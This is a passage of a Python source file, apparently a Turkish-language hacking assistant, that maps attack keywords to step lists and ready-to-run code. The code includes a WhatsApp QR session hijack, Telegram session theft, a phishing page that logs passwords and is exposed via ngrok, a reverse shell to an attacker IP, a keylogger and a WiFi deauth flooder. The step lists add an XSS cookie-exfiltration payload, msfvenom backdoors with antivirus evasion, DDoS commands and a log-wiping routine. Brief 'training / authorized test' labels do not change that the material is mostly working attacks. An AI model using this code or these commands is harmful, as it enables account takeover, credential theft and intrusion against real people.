                    "Vishing: telefonla arayıp OTP/kimlik bilgisi talep et (rol yaparak).",
                    "Smishing: resmi görünümlü SMS ile sahte bağlantı / kod iste.",
                    "Baiting: USB bırakma, QR kod yapıştırma (kötü amaçlı).",
                    "Elde edilen bilgiyi yetkili test raporuna dönüştür.",
                ],
                "mitigation": "Çalışan eğitimi, kimlik doğrulama prosedürü, ikinci kanal onayı.",
                "commands": ["gophish", "# Twilio vishing test (API)", "curl -X POST https://api.twilio.com/... "],
                "code_key": "phishing_page",
            },
            "osint": {
                "title": "OSINT — Açık Kaynak İstihbarat",
                "summary": "Telefon, e-posta ve kullanıcı adı üzerinden açık kaynaklardan hedef hakkında veri toplama.",
                "keywords": [("osint", 6), ("istihbarat", 5), ("kayıt ara", 4), ("phone lookup", 5),
                             ("numara ara", 5), ("sherlock", 5), ("holehe", 5), ("recon", 4),
                             ("kullanıcı adı ara", 5), ("e-posta ara", 5)],
                "tools": ["theHarvester", "Sherlock", "Holehe", "PhoneInfoga", "recon-ng", "Maltego CE", "Sublist3r"],
                "steps": [
                    "Telefon: PhoneInfoga ile numara formatını doğrula, ülke/operatör tespit et.",
                    "E-posta: Holehe ile hangi platformlarda kayıtlı olduğunu bul.",
                    "Kullanıcı adı: Sherlock ile 300+ sitede varlık tara.",
                    "Sızıntı veritabanları: haveibeenpwned, dehashed (legacy data) ile şifre/hesap eşleşmesi.",
                    "Sosyal medya: profil bilgileri, konum, arkadaş çevresi (Maltego grafiği).",
                    "Tüm verileri birleştir → hedef profil dosyası oluştur.",
                ],
                "tips": ["Kişisel verilerin toplanması KVKK/GDPR kapsamında; yalnızca yetkili testte kullan."],
                "mitigation": "Sosyal medyada bilgi paylaşımını azalt, e-posta/telefonu platformlardan gizle.",
                "commands": ["theHarvester -d hedef.com -b all", "sherlock kullanici", "holehe mail@site.com",
                             "phoneinfoga scan -n '+90...'"],
                "code_key": "",
            },
            "password_crack": {
                "title": "Şifre Kırma (Hashcat / John)",
                "summary": "Hash'leri GPU ile kırma, wordlist ve rule tabanlı saldırılar.",
                "keywords": [("şifre kır", 6), ("password crack", 6), ("hashcat", 6), ("john", 5),
                             ("brute force", 5), ("wordlist", 5), ("rockyou", 5), ("sifre kirma", 6)],
                "tools": ["hashcat", "john (johnny)", "crunch (wordlist üret)", "CeWL (site bazlı)",
                          "seclists", "hydra (online)"],
                "steps": [
                    "Hash formatını belirle: hashcat --example-hashes | grep <tür> (md5, sha256, bcrypt, ntlm...).",
                    "Wordlist seç: rockyou.txt, seclists/Passwords.",
                    "Rule saldırısı: hashcat -r rules/best64.rule ile varyasyon üret.",
                    "GPU kullan: -w 3 -O (optimize) ile hızlandır.",
                    "Online servisler için: hydra (SSH, FTP, web login) — rate-limit'e dikkat.",
                    "Sonuçları raporla, zayıf şifreleri listele.",
                ],
                "mitigation": "Uzun/rastgele şifre, passphrase, MFA, şifre yöneticisi.",
                "commands": ["hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt",
                             "hydra -l admin -P pass.txt ssh://hedef", "crunch 8 8 abc123 -o wl.txt"],
                "code_key": "hashcat",
            },
            "wifi": {
                "title": "WiFi Ağ Testleri (WPA2)",
                "summary": "Monitor mode, handshake yakalama, deauth ve offline kırma metodolojisi.",
                "keywords": [("wifi", 6), ("kablosuz", 5), ("wpa2", 6), ("wep", 5), ("aircrack", 6),
                             ("deauth", 5), ("handshake", 5), ("wifi şifre", 6), ("wifi hack", 6)],
                "tools": ["aircrack-ng (airmon-ng, airodump-ng, aireplay-ng)", "hashcat (PMKID)", "Wifite", "Wireshark"],
                "steps": [
                    "Adapteri monitor mode'a al: airmon-ng start wlan0.",
                    "Ağları tara: airodump-ng wlan0mon → hedef BSSID/kanal seç.",
                    "Handshake yakala: airodump-ng -c <kanal> --bssid <BSSID> -w capture wlan0mon.",
                    "İstemci deauth: aireplay-ng -0 10 -a <BSSID> wlan0mon (yeniden bağlanma → handshake).",
                    "Kır: aircrack-ng -w rockyou.txt capture.cap (veya hashcat PMKID).",
                    "WPS varsa: reaver / bully ile PIN brute force dene.",
                ],
                "mitigation": "WPA3/WPA2+802.1X, uzun karmaşık şifre, WPS kapat, misafir ağı izole.",
                "commands": ["airmon-ng start wlan0", "airodump-ng wlan0mon", "aireplay-ng -0 10 -a BSSID wlan0mon",
                             "aircrack-ng -w rockyou.txt cap.cap"],
                "code_key": "wifi_deauth",
            },
            "sqli": {
                "title": "SQL Injection",
                "summary": "Veritabanına sızma: hata tabanlı, UNION, boolean ve time-based teknikleri.",
                "keywords": [("sql injection", 7), ("sqli", 6), ("sql enjeksiyon", 6), ("union", 4),
                             ("veritabanı sızma", 5), ("sqlmap", 6), ("sql injection nasıl", 6)],
                "tools": ["sqlmap", "Burp Suite", "FFUF (parametre keşfi)", "jSQL Injection"],
                "steps": [
                    "Parametreleri fuzz et: id=1' → hata mesajına bak.",
                    "sqlmap ile otomatik tara: sqlmap -u 'http://hedef/page?id=1' --dbs",
                    "UNION testi: ORDER BY ile kolon sayısını bul.",
                    "Boolean/time-based: AND 1=1 vs AND 1=2 farkını ölç.",
                    "Veri çek: --dump ile tabloları indir (yetkili testte onaylı hedef).",
                    "Raporla: etkilenen parametre, DB türü, risk seviyesi.",
                ],
                "mitigation": "Prepared statement / parametrize sorgu, girdi doğrulama, WAF, least-privilege DB.",
                "commands": ["sqlmap -u 'http://hedef/page?id=1' --dbs", "sqlmap -u 'http://hedef/page?id=1' -D db -T users --dump",
                             "ffuf -u 'http://hedef/FUZZ' -w common.txt"],
                "code_key": "sqli_fuzz",
            },
            "xss": {
                "title": "XSS — Cross-Site Scripting",
                "summary": "Reflected, stored ve DOM XSS ile oturum çalma ve tarayıcı kontrolü.",
                "keywords": [("xss", 6), ("cross site", 5), ("script saldırı", 4), ("cookie çal", 5),
                             ("xss saldırı", 5), ("xss payload", 4)],
                "tools": ["Burp Suite", "BeEF", "XSS Hunter", "DalFox (tarayıcı)"],
                "steps": [
                    "Girdi noktalarını bul: arama, yorum, profil alanları.",
                    "Test payloadları: <script>alert(1)</script>, <img src=x onerror=alert(1)>.",
                    "Reflected/Stored farkını belirle (Stored daha tehlikeli).",
                    "Cookie exfil: <script>fetch('http://saldirgan/?c='+document.cookie)</script>.",
                    "BeEF hook: <script src='http://beef:3000/hook.js'></script> ile tarayıcıyı kontrol et.",
                    "DOM XSS: document.write / innerHTML kullanan JS akışlarını incele.",
                ],
                "mitigation": "Çıktı kodlama (output encoding), CSP başlığı, HttpOnly cookie, girdi sanitizasyonu.",
                "commands": ["python3 -m http.server 80", "dalfox url http://hedef/?q=FUZZ"],
                "code_key": "xss",
            },
            "reverse_shell": {
                "title": "Reverse Shell / Backdoor",
                "summary": "Hedef makineden saldırgana bağlantı kuran shell; çeşitli dillerde payload.",
                "keywords": [("reverse shell", 7), ("ters kabuk", 6), ("backdoor", 6), ("shell al", 6),
                             ("msfvenom", 5), ("dinleme", 4), ("shellcode", 4), ("ters bağlantı", 5)],
                "tools": ["netcat", "msfvenom + msfconsole", "socat", "python3"],
                "steps": [
                    "Dinleyici aç: nc -lvnp 4444 (veya msfconsole multi/handler).",
                    "Payload seç: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf",
                    "Windows: -p windows/x64/meterpreter/reverse_tcp -f exe",
                    "Hedefe ulaştır (phishing, upload zafiyeti, USB...).",
                    "Bağlantı gelince shell kontrol et; stabilite için python3 -c 'import pty...' ile TTY yükselt.",
                    "İşlem bitince oturumu kapat, izleri temizle.",
                ],
                "mitigation": "Egress filtreleme, AV/EDR, uygulama whitelisting, ağ segmentasyonu.",
                "commands": ["nc -lvnp 4444", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o s.elf",
                             "socat TCP:IP:4444 EXEC:sh"],
                "code_key": "reverse_shell",
            },
            "privesc": {
                "title": "Yetki Yükseltme (Privilege Escalation)",
                "summary": "Düşük yetkili kullanıcıdan root/administrator'a çıkma teknikleri.",
                "keywords": [("yetki yükselt", 7), ("privesc", 6), ("privilege escalation", 6), ("root al", 6),
                             ("sudo", 4), ("suid", 5), ("linpeas", 5), ("winpeas", 5)],
                "tools": ["linpeas.sh", "winpeas.exe", "GTFOBins (sudo/SUID)", "pspy", "LSE"],
                "steps": [
                    "Sistem bilgisi: uname -a, cat /etc/os-release.",
                    "linpeas çalıştır: ./linpeas.sh → ilginç çıktıları incele.",
                    "sudo hakları: sudo -l → GTFOBins'ten kaçış dene (sudo vim, sudo python...).",
                    "SUID dosyalar: find / -perm -4000 2>/dev/null → GTFOBins eşleştir.",
                    "Cron görevleri: yazılabilir script'leri kontrol et (pspy ile izle).",
                    "Kernel exploit: searchsploit <kernel sürümü> (güncel değilse).",
                ],
                "mitigation": "Yamalama, least-privilege, sudoers sınırlama, SUID kaldırma.",
                "commands": ["curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                             "sudo -l", "find / -perm -4000 2>/dev/null"],
                "code_key": "privesc",
            },
            "malware": {
                "title": "Zararlı Yazılım (Malware) Analizi",
                "summary": "Trojan, stealer ve FUD konseptleri; savunma açısından inceleme metodolojisi.",
                "keywords": [("malware", 6), ("zararlı", 5), ("trojan", 6), ("virüs", 5), ("fud", 5),
                             ("stealer", 5), ("crypter", 4)],
                "tools": ["msfvenom", "Veil", "TheFatRat", "upx (packer)", "VirusTotal (analiz)", "Cuckoo (sandbox)"],
                "steps": [
                    "Payload üret: msfvenom (AV'ye yakalanmama için packer/obfuscation ekle).",
                    "FUD testi: VirusTotal'de tespit oranını ölç (eğitim için).",
                    "Dağıtım: phishing eki, USB, drive-by download.",
                    "Analiz (savunma): Cuckoo sandbox'ta davranış analizi, strings, PE-bear.",
                    "Kalıcılık: registry (Windows) / crontab (Linux) — tespit için önemli.",
                ],
                "mitigation": "AV/EDR, uygulama kontrolü, e-posta filtreleme, kullanıcı eğitimi.",
                "commands": ["msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -e x64/xor -o p.exe",
                             "upx -9 p.exe"],
                "code_key": "reverse_shell",
            },
            "keylogger": {
                "title": "Keylogger",
                "summary": "Tuş vuruşlarını kaydeden yazılım; donanımsal ve yazılımsal türleri.",
                "keywords": [("keylogger", 7), ("tuş kaydedici", 6), ("tuşları kaydet", 5), ("klavye dinle", 5),
                             ("keylogger nasıl", 6)],
                "tools": ["pynput (Python)", "Windows GetAsyncKeyState API", "Donanım keylogger (USB)"],
                "steps": [
                    "Python: pynput.keyboard.Listener ile tuşları yakala.",
                    "Logları dosyaya/HTTP'e gönder (exfil).",
                    "Windows API: GetAsyncKeyState döngüsü (C/C++).",
                    "Kalıcılık: startup klasörü / registry Run key.",
                    "AV'den kaçınma: obfuscate + pack (eğitim).",
                ],
                "mitigation": "AV/EDR, tuş takımı izleme, donanım portları kontrolü, ekran klavyesi (hassas alanlar).",
                "commands": ["pip install pynput"],
                "code_key": "keylogger",
            },
            "rat": {
                "title": "RAT — Uzaktan Erişim Truva Atı",
                "summary": "Hedef makineyi uzaktan kontrol eden yazılım; kamera, dosya, shell kontrolü.",
                "keywords": [("rat", 6), ("uzaktan erişim", 6), ("remote access", 5), ("c2", 5),
                             ("komut kontrol", 4), ("uzaktan kontrol", 5)],
                "tools": ["Metasploit (meterpreter)", "Covenant / Sliver (C2)", "Empire", "TheFatRat"],
                "steps": [
                    "Stager üret: msfvenom reverse_tcp stager.",
                    "C2 kur: msfconsole multi/handler veya Sliver.",
                    "Hedefe ulaştır ve çalıştır.",
                    "Meterpreter: sysinfo, screenshot, webcam_snap, download/upload, shell.",
                    "Kalıcılık: persistence_exe, autorun (metasploit modülleri).",
                    "Erişimi doğrula, tespit için logları incele (savunma perspektifi).",
                ],
                "mitigation": "EDR + davranış analizi, ağ segmentasyonu, egress filtreleme.",
                "commands": ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o r.exe",
                             "msfconsole -q -x 'use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST IP; run'"],
                "code_key": "reverse_shell",
            },
            "evasion": {
                "title": "Antivirüs / EDR Bypass",
                "summary": "İmza tabanlı ve davranışsal tespitleri aşma teknikleri (yetkili testler için).",
                "keywords": [("bypass", 6), ("antivirüs atlat", 6), ("edr", 5), ("amsi", 6), ("evasion", 6),
                             ("tespit", 4), ("powershell bypass", 5), ("antivirüs", 4)],
                "tools": ["PowerShell (AMSI bypass)", "msfvenom encoders", "upx", "Veil", "ScareCrow", "Shellter"],
                "steps": [
                    "AMSI bypass: ilk satırda AMSI'yi kapat (Reflection ile patch).",
                    "PowerShell obfuscation: -enc base64, string parçalama, Invoke-Obfuscation.",
                    "Packer: upx ile payload sıkıştır (imza değişir).",
                    "Living-off-the-land: powershell.exe, mshta, rundll32 ile yükleme.",
                    "Process injection: CreateRemoteThread / APC (C++ örnek).",
                    "Tespit testi: Defender / EDR loglarını incele (savunma tarafı).",
                ],
                "mitigation": "EDR davranış analizi, AMSI zorunlu, applocker, log merkezi (SIEM).",
                "commands": ["powershell -enc <base64>", "Invoke-Obfuscation"],
                "code_key": "evasion",
            },
            "anonymous": {
                "title": "Anonimlik / İz Bırakmama",
                "summary": "Tor, proxychains, MAC spoofing ve opsec kuralları ile iz yönetimi.",
                "keywords": [("anonim", 6), ("tor", 5), ("proxy", 5), ("vpn", 4), ("iz bırakma", 5),
                             ("opsec", 5), ("mac değiş", 4), ("izini gizle", 5), ("anonimlik", 6)],
                "tools": ["Tor Browser / tor", "proxychains", "MACchanger", "Tails OS", "VPN (log tutmayan)"],
                "steps": [
                    "Tails boot et veya Tor Browser kullan (en güvenli varsayılan).",
                    "proxychains: tüm araçları Tor üzerinden yönlendir (nmap, curl).",
                    "MAC spoof: macchanger -r wlan0 (ağ seviyesi iz bırakma).",
                    "DNS sızıntısı kontrolü: dnsleaktest.",
                    "Opsec: gerçek kimlik bilgisi kullanma, aynı hesaba giriş yapma, zaman dilimi tutarlılığı.",
                    "İş bitince tüm logları temizle: history -c, rm log dosyaları, shred.",
                ],
                "mitigation": "Kurumsal: egress filtreleme, DNS logging, Tor trafiği tespiti.",
                "commands": ["proxychains nmap -sT -Pn hedef.com", "macchanger -r eth0", "tor &", "shred -u dosya.txt"],
                "code_key": "",
            },
            "crypto": {
                "title": "Kriptografi / Hash Araçları",
                "summary": "Hash üretimi, base64, openssl şifreleme ve şifre hash analizi.",
                "keywords": [("şifrele", 5), ("encrypt", 5), ("hash", 5), ("sha", 4), ("md5", 4),
                             ("base64", 5), ("openssl", 4), ("kripto", 4)],
                "tools": ["openssl", "hashcat", "xxd", "python3 (hashlib/base64)"],
                "steps": [
                    "Hash üret: echo -n 'metin' | md5sum / sha256sum.",
                    "Base64: echo 'metin' | base64 / base64 -d.",
                    "AES şifreleme: openssl enc -aes-256-cbc -salt -in dosya -out dosya.enc.",
                    "Zayıf hash tespiti: hashcat mode listesinden türü bul.",
                    "Salt kontrolü: aynı şifre → farklı hash olmalı (bcrypt/argon2 tercih).",
                ],
                "mitigation": "bcrypt/argon2, tuzlama, uzun anahtar, donanım HSM.",
                "commands": ["echo -n 'x' | sha256sum", "openssl enc -aes-256-cbc -salt -in f -out f.enc -k sifre",
                             "base64 <<< 'metin'"],
                "code_key": "hashcat",
            },
            "recon": {
                "title": "Keşif / Port Tarama (Recon)",
                "summary": "Nmap, alt alan adı keşfi, dizin fuzzing ve servis tespiti ile yüzey haritalama.",
                "keywords": [("nmap", 6), ("port tarama", 6), ("keşif", 5), ("recon", 5), ("subdomain", 5),
                             ("dizin", 4), ("gobuster", 5), ("fuzz", 4), ("port scan", 5)],
                "tools": ["nmap", "sublist3r / amass", "gobuster / ffuf", "nikto", "whatweb", "dnsrecon"],
                "steps": [
                    "Host keşfi: nmap -sn 10.10.0.0/24 (pingsiz: -Pn).",
                    "Port tarama: nmap -sS -sV -O hedef (sürüm + OS).",
                    "Varsayılan script: nmap -sC hedef (vuln, banner).",
                    "Alt alan adları: sublist3r -d hedef.com; amass enum.",
                    "Dizin fuzz: gobuster dir -u http://hedef -w common.txt.",
                    "Web analizi: whatweb, nikto, robots.txt, kaynak kodu.",
                ],
                "mitigation": "Gereksiz portları kapat, servisleri güncelle, WAF, API rate-limit.",
                "commands": ["nmap -sV -sC -O hedef.com", "gobuster dir -u http://hedef -w /usr/share/wordlists/dirb/common.txt",
                             "sublist3r -d hedef.com", "nikto -h http://hedef"],
                "code_key": "nmap",
            },
            "ddos": {
                "title": "DDoS / DoS Stres Testi",
                "summary": "SYN flood, UDP flood, slowloris ve HTTP flood teknikleri (yetkili testler için).",
                "keywords": [("ddos", 6), ("dos saldırı", 6), ("flood", 5), ("slowloris", 6), ("syn", 4),
                             ("hping3", 5), ("ddos saldırı", 6)],
                "tools": ["hping3", "slowloris (Python)", "mdk3 (WiFi)", "LOIC/HOIC (sadece eğitim)", "GoldenEye"],
                "steps": [
                    "SYN flood: hping3 -S --flood -p 80 hedef.",
                    "UDP flood: hping3 -2 --flood hedef.",
                    "Slowloris: bağlantıları yarım bırak (slowloris hedef.com).",
                    "HTTP flood: paralel GET istekleri (Python/GO).",
                    "Ölç: yanıt süresi, paket kaybı (ping -f).",
                    "Rapor: etki süresi, savunma boşlukları.",
                ],
                "mitigation": "CDN/WAF (Cloudflare), rate-limit, SYN cookie, bant genişliği fazlalığı.",
                "commands": ["hping3 -S --flood -p 80 hedef", "slowloris hedef.com", "mdk3 wlan0mon a -a BSSID"],
                "code_key": "ddos",
            },
            "session": {
                "title": "Oturum / Cookie Saldırıları",
                "summary": "Session fixation, cookie hırsızlığı ve hijack teknikleri.",
                "keywords": [("session", 6), ("oturum", 5), ("cookie", 6), ("token çal", 5), ("hijack", 5),
                             ("fixation", 5), ("oturum çalma", 5)],
                "tools": ["Burp Suite", "BeEF", "Tamper Data", "Cookie-Editor (test)"],
                "steps": [
                    "Cookie özelliklerini incele: HttpOnly, Secure, SameSite eksikleri.",
                    "XSS ile cookie exfil dene (HttpOnly yoksa).",
                    "Session fixation: oturum ID'sini önceden belirleme testi.",
                    "Token tahmin: zayıf rastgelelik analizi (Burp sequencer).",
                    "Hijack: çalınan cookie'yi başka tarayıcıda kullan (test).",
                ],
                "mitigation": "HttpOnly + Secure + SameSite, oturum ID rotasyonu, güçlü rastgelelik.",
                "commands": ["# BeEF hook ile cookie çekme", "<script src='http://IP:3000/hook.js'></script>"],
                "code_key": "xss",
            },
            "mitm": {
                "title": "MITM — Ortadaki Adam",
                "summary": "ARP spoofing, SSL strip ve trafik dinleme teknikleri.",
                "keywords": [("mitm", 6), ("ortadaki adam", 6), ("arp spoof", 6), ("ettercap", 5),
                             ("bettercap", 5), ("dinleme", 4), ("ssl strip", 5), ("trafik dinle", 5)],
                "tools": ["bettercap", "ettercap", "arpspoof + dsniff", "Wireshark", "mitmproxy"],
                "steps": [
                    "IP forwarding aç: echo 1 > /proc/sys/net/ipv4/ip_forward.",
                    "ARP spoof: bettercap veya arpspoof -i eth0 -t hedef -r gateway.",
                    "Trafiği yakala: Wireshark / tshark canlı izle.",
                    "SSL strip: mitmproxy ile HTTPS'ten bilgi çekmeyi dene (eğitim).",
                    "Kimlik bilgileri düşerse raporla; hedefe HTTPS/HSTS öner.",
                ],
                "mitigation": "HSTS, sertifika sabitleme, VLAN izolasyonu, port güvenliği (DAI).",
                "commands": ["echo 1 > /proc/sys/net/ipv4/ip_forward", "arpspoof -i eth0 -t HEDEF GW",
                             "bettercap -eval 'set arp.spoof.targets HEDEF; arp.spoof on'"],
                "code_key": "mitm",
            },
            "metasploit": {
                "title": "Metasploit Framework",
                "summary": "Exploit modülleri, payload üretimi ve post-exploitation iş akışı.",
                "keywords": [("metasploit", 7), ("msf", 6), ("msfvenom", 6), ("meterpreter", 5), ("exploit", 4),
                             ("msfconsole", 5)],
                "tools": ["msfconsole", "msfvenom", "searchsploit", "Metasploit Community"],
                "steps": [
                    "Başlat: msfconsole.",
                    "Ara: search <servis/versiyon> (ör: search apache).",
                    "Modül seç: use exploit/multi/http/...",
                    "Ayarla: set RHOSTS, set LHOST, set PAYLOAD.",
                    "Çalıştır: run → oturum gelirse sessions -i 1.",
                    "Post-exploitation: getsystem (windows), shell, download.",
                ],
                "mitigation": "Yamalama, exploit tespiti (IDS), ağ segmentasyonu.",
                "commands": ["msfconsole", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o m.elf",
                             "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run"],
                "code_key": "metasploit",
            },
            "webapp": {
                "title": "Web Uygulama / API Güvenlik Testi (JWT)",
                "summary": "OWASP Top 10 akışı, API testi, JWT token analizi ve oturum yönetimi kontrolleri.",
                "keywords": [("web app", 5), ("web uygulama", 5), ("api", 5), ("jwt", 6), ("token", 4),
                             ("burp", 5), ("rest", 4), ("endpoint", 4), ("owasp", 5), ("api test", 5)],
                "tools": ["Burp Suite", "OWASP ZAP", "Postman", "jwt_tool", "ffuf", "nuclei"],
                "steps": [
                    "Yüzeyi haritala: robots.txt, sitemap, API dokümantasyonu (swagger/openapi), JS dosyaları.",
                    "Auth testi: default creds, zayıf şifre politikası, rate-limit, brute force.",
                    "JWT analizi: alg=none, zayıf HS256 anahtar (jwt_tool/hashcat), exp/iat manipülasyonu.",
                    "IDOR: /api/user/1 → /api/user/2 erişim kontrolü testi.",
                    "Parametre fuzz: ffuf ile gizli endpoint ve parametre keşfi.",
                    "OWASP Top 10 taraması: ZAP veya nuclei ile otomatik tarama, bulguları raporla.",
                ],
                "tips": ["JWT'de alg=none veya 'kid' parametresi manipülasyonu sık bulunur — jwt_tool ile dene."],
                "mitigation": "JWT için güçlü imza + kısa exp, RBAC, rate-limit, CORS doğrulama, OWASP ASVS.",
                "commands": ["jwt_tool <token>", "ffuf -u http://hedef/api/FUZZ -w api_words.txt",
                             "nuclei -u http://hedef", "zap-cli quick-scan http://hedef"],
                "code_key": "",
            },
        }

    # ═══════════════════════════ KOD KÜTÜPHANESİ (ÇALIŞAN KODLAR) ═══════════════════════════
    def _build_code_lib(self):
        return {
            "whatsapp_qr": r'''// WhatsApp QR oturum devralma (EGITIM / YETKILI TEST)
// Kurulum: npm i whatsapp-web.js qrcode-terminal
const { Client, LocalAuth } = require("whatsapp-web.js");
const qrcode = require("qrcode-terminal");

const client = new Client({
    authStrategy: new LocalAuth({ dataPath: "./session" })  // oturum buraya kaydedilir
});

client.on("qr", qr => {
    qrcode.generate(qr, { small: true });
    console.log("[!] Kurban bu QR kodu taratirsa oturum sende kurulur.");
});

client.on("ready", async () => {
    console.log("[+] Oturum aktif! Sohbetler ve mesajlar erisilebilir.");
    const chats = await client.getChats();
    chats.slice(0, 10).forEach(c => console.log("Sohbet:", c.name));
});

client.on("message", msg => {
    console.log("[" + msg.from + "] " + msg.body);
});

client.initialize();''',

            "telegram_session": r'''# Telegram session restore (EGITIM / YETKILI TEST)
# pip install telethon
from telethon import TelegramClient

API_ID = 123456          # my.telegram.org'dan al
API_HASH = "xxxx"        # my.telegram.org'dan al
SESSION_FILE = "hedef.session"   # hedef cihazdan cekilen session dosyasi

client = TelegramClient(SESSION_FILE, API_ID, API_HASH)

async def main():
    await client.connect()
    if not await client.is_user_authorized():
        print("[!] Session gecersiz, SMS kodu istenecek:")
        await client.send_code_request("+905551234567")
        code = input("Kod: ")
        await client.sign_in("+905551234567", code)
    me = await client.get_me()
    print("[+] Oturum acildi:", me.first_name, me.username)
    async for msg in client.iter_messages("me", limit=20):
        print(msg.date, msg.text)

with client:
    client.loop.run_until_complete(main())''',

            "sms_services": r'''# 5sim API ile sanal numara + OTP (EGITIM)
# pip install requests
import requests, time

API_KEY = "your_api_key"
BASE = "https://5sim.net/v1"
h = {"Authorization": f"Bearer {API_KEY}"}

# Numara satin al (ulke=turkey, servis=whatsapp)
r = requests.get(f"{BASE}/user/buy/activation/any/turkey/any/whatsapp", headers=h)
data = r.json()
order_id, phone = data.get("id"), data.get("phone")
print(f"[+] Numara: {phone} (siparis: {order_id})")

# OTP bekle
for _ in range(30):
    time.sleep(2)
    r = requests.get(f"{BASE}/user/check/{order_id}", headers=h)
    sms = r.json().get("sms")
    if sms:
        print("[+] Gelen SMS:", sms[0]["text"])
        print("[+] OTP:", sms[0]["text"].split()[-1])
        break''',

            "otp_reader": r'''// Android OTP okuyucu (AccessibilityService) — EGITIM / KENDI CIHAZIN
// res/xml/otp_service_config.xml:
// <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
//     android:accessibilityEventTypes="typeWindowContentChanged"
//     android:accessibilityFeedbackType="feedbackGeneric"
//     android:canRetrieveWindowContent="true"
//     android:notificationTimeout="100" />
package com.test.otp

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class OtpService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return
        val text = extractText(rootInActiveWindow)
        val otp = Regex("""\b\d{6}\b""").find(text)?.value
        if (otp != null) {
            Log.i("OTP", "YAKALANDI: $otp")  // EGITIM: sadece log; exfil YETKILI test disinda yasak
        }
    }

    private fun extractText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = StringBuilder()
        node.text?.let { sb.append(it).append("\n") }
        for (i in 0 until node.childCount) sb.append(extractText(node.getChild(i)))
        return sb.toString()
    }

    override fun onInterrupt() {}
}''',

            "keylogger": r'''# Keylogger (EGITIM / KENDI SISTEMIN)
# pip install pynput
from pynput import keyboard
from datetime import datetime

LOG_FILE = "keys.log"

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f"<{key}>"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now().isoformat()} {k}\n")
    print(f"[+] {k}")

print(f"[*] Tuslar {LOG_FILE} dosyasina yaziliyor. ESC ile cik.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()''',

            "phishing_page": r'''# ─── EGITIM / YETKILI TEST: Phishing simülasyon kiti ───
# 1) python3 phishing_kit.py  2) logs.txt'ye yazilir
# 3) Internete acmak icin: ngrok http 8080
# pip install flask
from flask import Flask, request
import datetime

app = Flask(__name__)

LOGIN_PAGE = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Giris</title></head>
<body style="font-family:sans-serif;text-align:center;padding:60px">
<h2>Demo Giris (EGITIM)</h2>
<form method="POST" action="/login">
  <input name="user" placeholder="Kullanici adi" required><br><br>
  <input name="pass" type="password" placeholder="Sifre" required><br><br>
  <button type="submit">Giris Yap</button>
</form>
<p style="color:gray">Bu sayfa yalnizca yetkili guvenlik testleri icindir.</p>
</body></html>"""

@app.route("/")
def index():
    return LOGIN_PAGE

@app.route("/login", methods=["POST"])
def login():
    u = request.form.get("user", "")
    p = request.form.get("pass", "")
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {request.remote_addr} | {u} : {p}\n")
    return "<h2>Oturum suresi doldu, tekrar deneyin.</h2>"

if __name__ == "__main__":
    print("[+] Kit hazir: http://localhost:8080 | ngrok http 8080 ile internete ac")
    app.run(host="0.0.0.0", port=8080)''',

            "reverse_shell": r'''# ─── Reverse Shell (EGITIM / YETKILI TEST ORTAMI) ───
# DINLEYICI:  nc -lvnp 4444
# HEDEF:      python3 shell.py
import socket, subprocess

HOST = "10.10.14.5"   # saldirgan IP
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(b"[+] Baglanti kuruldu\n")
while True:
    s.send(b"$ ")
    cmd = s.recv(4096).decode(errors="ignore").strip()
    if not cmd:
        continue
    if cmd in ("exit", "quit"):
        break
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        data = out.stdout + out.stderr
    except Exception as e:
        data = str(e)
    s.send(data.encode(errors="ignore") + b"\n")
s.close()''',

            "wifi_deauth": r'''# WiFi Deauth + Handshake (EGITIM / KENDI AGIN)
# 1) airmon-ng start wlan0
# 2) airodump-ng wlan0mon      -> BSSID ve kanali not al
# 3) airodump-ng -c <kanal> --bssid <BSSID> -w cap wlan0mon
# 4) aireplay-ng -0 10 -a <BSSID> wlan0mon
# 5) aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap

# Scapy ile deauth paketi (ayni is):
# pip install scapy
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

BSSID = "AA:BB:CC:DD:EE:FF"   # hedef AP
IFACE = "wlan0mon"

pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=BSSID, addr3=BSSID)/Dot11Deauth(reason=7)
print(f"[*] {BSSID} adresine deauth gonderiliyor (Ctrl+C durdurur)")
sendp(pkt, iface=IFACE, count=1000, inter=0.01, verbose=False)''',

            "sqli_fuzz": r'''# SQLi otomatik tarama (EGITIM / YETKILI HEDEF)
# --- sqlmap ile ---
# sqlmap -u "http://hedef.com/page?id=1" --dbs
# sqlmap -u "http://hedef.com/page?id=1" -D db -T users --dump

# --- Python ile hata tabanli fuzz ---
import requests

URL = "http://hedef.com/page?id="
payloads = ["1", "1'", "1''", "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2", "1;--", "1'-- -"]

for p in payloads:
    try:
        r = requests.get(URL + p, timeout=5)
        ind = [w for w in ("sql", "syntax", "mysql", "postgres", "odbc", "ORA-") if w in r.text.lower()]
        if ind:
            print(f"[+] Payload '{p}' -> SQL hatasi: {ind}")
        else:
            print(f"[-] Payload '{p}' -> normal")
